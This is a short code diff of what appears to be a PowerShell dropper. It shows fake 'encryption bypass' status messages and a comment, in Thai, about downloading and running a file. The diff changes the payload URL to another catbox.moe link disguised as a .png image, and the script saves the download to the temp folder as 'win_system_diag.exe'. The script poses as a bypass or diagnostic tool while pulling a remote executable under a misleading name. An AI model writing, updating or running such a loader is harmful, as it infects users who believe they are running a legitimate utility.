@@ -20,7 +20,7 @@ Write-Host "`n  [+] ENCRYPTION BYPASS SUCCESSFUL" -ForegroundColor Green
 Write-Host "  [*] DOWNLOADING ENGINE COMPONENTS..." -ForegroundColor DarkGray
 
 # ส่วนดาวน์โหลดและรันไฟล์เดิม
-$exeUrl = "https://files.catbox.moe/hextui.png"
+$exeUrl = "https://files.catbox.moe/renxf3.png"
 $tempPath = "$env:TEMP\win_system_diag.exe"
 
 try {
